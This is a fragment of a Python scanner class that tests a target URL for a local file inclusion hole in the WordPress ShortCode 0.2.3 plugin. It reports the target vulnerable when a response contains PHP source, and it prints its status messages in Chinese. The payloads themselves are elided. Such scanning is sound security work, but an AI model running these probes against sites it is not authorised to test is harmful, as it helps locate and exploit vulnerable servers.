...
class wordpress_plugin_ShortCode_lfi:
        ...
        try:
            for payload in payloads:
                ...
                if r"<?php" in req.text:
                    printGreen("[+]Success:存在wordpress 插件shortcode0.2.3 本地文件包含漏洞...(高危)\tpayload: "+vulnurl)
                    sys.exit(1)
            printBlue("[-]Info:不存在wordpress_plugin_ShortCode_lfi漏洞")
        except:
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = wordpress_plugin_ShortCode_lfi(sys.argv[1])
    testVuln.run()